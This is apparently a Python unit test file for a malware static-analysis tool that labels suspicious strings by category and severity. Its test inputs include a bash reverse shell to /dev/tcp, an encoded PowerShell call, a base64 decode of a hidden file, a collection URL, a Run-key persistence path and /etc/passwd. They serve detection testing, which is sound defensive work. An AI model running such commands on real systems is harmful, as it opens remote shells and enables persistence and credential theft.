"""
tests/test_strings_explain.py — Unit tests for detailed, plain-language
string explanations (strings/explain.py).
"""

from static_analysis.strings.explain import explain_string
from static_analysis.strings.models import ExtractedString, StringType


def _string(value: str, string_type: StringType = StringType.ASCII) -> ExtractedString:
    return ExtractedString(value=value, string_type=string_type, offset=0, length=len(value), encoding="ascii")


class TestExplainString:
    def test_known_keyword_cmd_exe_explained(self):
        explanation = explain_string(_string("cmd.exe"))
        assert explanation is not None
        assert explanation.category == "shell_execution"
        assert "command interpreter" in explanation.explanation

    def test_known_keyword_powershell_explained(self):
        explanation = explain_string(_string("powershell -enc payload"))
        assert explanation is not None
        assert explanation.category == "living_off_the_land"

    def test_known_keyword_base64_decode_explained(self):
        explanation = explain_string(_string("base64 -d hidden.b64"))
        assert explanation is not None
        assert explanation.category == "obfuscation"

    def test_reverse_shell_is_critical_severity(self):
        explanation = explain_string(_string("bash -i >& /dev/tcp/1.2.3.4/4444 reverse shell"))
        assert explanation is not None
        assert explanation.severity == "critical"

    def test_url_indicator_explained_as_network_indicator(self):
        explanation = explain_string(_string("http://185.220.101.45/collect", StringType.URL))
        assert explanation is not None
        assert explanation.category == "network_indicator"

    def test_registry_path_indicator_explained_as_persistence(self):
        explanation = explain_string(_string(r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", StringType.REGISTRY_PATH))
        assert explanation is not None
        assert explanation.category == "persistence"

    def test_ordinary_string_has_no_explanation(self):
        assert explain_string(_string("hello world this is just program text")) is None

    def test_different_keywords_yield_distinct_explanations(self):
        cmd_explanation = explain_string(_string("cmd.exe"))
        ps_explanation = explain_string(_string("powershell"))
        assert cmd_explanation.explanation != ps_explanation.explanation

    def test_short_junk_unix_paths_rejected(self):
        for junk in ["/L", "/@", "/H", "/I1", "/a", "/"]:
            assert explain_string(_string(junk, StringType.UNIX_PATH)) is None

    def test_valid_unix_paths_explained(self):
        for valid_path in ["/bin/sh", "/etc/passwd", "/tmp/malware.sh", "/opt/myapp/config.json"]:
            explanation = explain_string(_string(valid_path, StringType.UNIX_PATH))
            assert explanation is not None
            assert explanation.category in ("shell_execution", "credential_access", "filesystem_indicator", "persistence")
        # Explicit test for unix_path fallback
        custom_path = explain_string(_string("/opt/custom_dir/data.bin", StringType.UNIX_PATH))
        assert custom_path is not None
        assert custom_path.category == "filesystem_indicator"
